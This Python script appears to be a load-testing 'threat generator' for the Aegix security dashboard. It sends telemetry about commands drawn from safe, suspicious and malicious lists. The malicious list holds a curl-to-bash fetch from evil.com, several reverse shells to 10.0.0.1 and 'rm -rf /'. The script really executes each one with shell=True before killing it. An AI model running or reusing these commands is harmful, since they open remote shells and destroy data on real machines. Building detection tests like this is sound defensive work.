import os
import sys
import subprocess
import time
import requests
import random

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Lists of commands with their classification categories
SAFE_COMMANDS = [
    "echo 'Initializing Aegix Security Agent...'",
    "whoami",
    "hostname",
    "ipconfig",
    "dir",
    "ping 127.0.0.1 -n 1"
]

SUSPICIOUS_COMMANDS = [
    "curl -s http://example.com/check_status.sh",
    "wget http://temp-storage-host.net/bin/patch.exe -O patch.exe",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command 'Get-Process'",
    "base64 --decode temp_payload.b64"
]

MALICIOUS_COMMANDS = [
    "powershell -Command \"Start-Sleep -Seconds 15\" && curl http://evil.com/shell.sh | bash",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "powershell -Command \"Start-Sleep -Seconds 15\" && nc -e /bin/sh 10.0.0.1 4242",
    "powershell -Command \"Start-Sleep -Seconds 15\" && ncat 10.0.0.1 4444 -e /bin/bash",
    "rm -rf / --no-preserve-root"
]

def main():
    print("""
=========================================================
 ???  AEGIX Windows High-Velocity Threat Generator  ???
=========================================================
 This script simulates high-frequency command execution
 (5-8 commands/sec) to stress-test and showcase the bouncer
 dashboard under heavy load.

 Auto-remediated threats will be killed in real-time.
=========================================================
""")

    backend_url = "http://localhost:8000"
    
    print("To link this test stream to your browser dashboard:")
    session_token = input("Enter Session Token (optional, press Enter to skip): ").strip()
    
    limit = input("How many commands to simulate? (Default: 500): ").strip()
    max_commands = int(limit) if limit.isdigit() else 500
    
    print(f"\n?? Launching simulation stream ({max_commands} commands)...")
    print("?? Press Ctrl+C to abort at any time.\n")
    
    count = 0
    while count < max_commands:
        try:
            # 1. Randomly pick command category
            # 60% Safe, 25% Suspicious, 15% Malicious
            rand = random.random()
            if rand < 0.60:
                command = random.choice(SAFE_COMMANDS)
                category = "safe"
            elif rand < 0.85:
                command = random.choice(SUSPICIOUS_COMMANDS)
                category = "suspicious"
            else:
                command = random.choice(MALICIOUS_COMMANDS)
                category = "malicious"
                
            count += 1
            print(f"[{count}/{max_commands}] SPAWN: $ {command}")
            
            # 2. Spawn subprocess
            try:
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                pid = proc.pid
            except Exception as e:
                print(f"    ? Subprocess launch failed: {e}")
                continue
                
            # 3. Gather memory stats
            mem_mb = 0.0
            sys_mem = 0.0
            if PSUTIL_AVAILABLE:
                try:
                    ps_proc = psutil.Process(pid)
                    mem_mb = ps_proc.memory_info().rss / (1024 * 1024)
                    sys_mem = psutil.virtual_memory().percent
                except:
                    pass
                    
            # 4. Forward telemetry
            payload = {
                "agent_id": "windows-threat-generator",
                "pid": pid,
                "ppid": os.getpid(),
                "uid": 1000,
                "gid": 1000,
                "command": command,
                "argv_str": command,
                "comm": "cmd.exe" if os.name == 'nt' else 'bash',
                "process_memory_mb": mem_mb,
                "system_memory_percent": sys_mem
            }
            
            url = f"{backend_url}/agent/events"
            params = {}
            if session_token:
                params["session_token"] = session_token
                
            try:
                res = requests.post(url, json=payload, params=params, timeout=5)
                if res.status_code == 200:
                    data = res.json()
                    classification = data.get("classification", "safe")
                    score = data.get("risk_score", 0.0)
                    
                    # Pause briefly for bouncer remediation action to hit
                    time.sleep(0.15)
                    
                    poll = proc.poll()
                    if classification == "malicious":
                        if poll is not None:
                            print(f"    ?? [MALICIOUS - Score: {score:.0f}] Intercepted & Killed PID {pid}!")
                        else:
                            print(f"    ?? [MALICIOUS - Score: {score:.0f}] Not killed (Is Auto-Remediation ON?)")
                            proc.kill()
                    elif classification == "suspicious":
                        print(f"    ?? [SUSPICIOUS - Score: {score:.0f}] Logged.")
                        proc.kill()
                    else:
                        print(f"    ?? [SAFE] Logged.")
                        proc.kill()
                elif res.status_code == 429:
                    print("    ??  [RATE LIMIT] Throttled by backend. Set DISABLE_RATE_LIMITER=true to bypass.")
                    proc.kill()
                else:
                    print(f"    [Error] Backend API error: {res.status_code}")
                    proc.kill()
            except Exception as e:
                print(f"    [Error] Failed to connect to backend: {e}")
                proc.kill()
                
            # Sleep to achieve 5-8 commands per second (0.12s to 0.20s per event)
            time.sleep(random.uniform(0.12, 0.20))
            
        except KeyboardInterrupt:
            print("\nSimulation aborted by user.")
            break
            
    print(f"\nFinished. Sent {count} simulated command events to Aegix.")

if __name__ == "__main__":
    main()
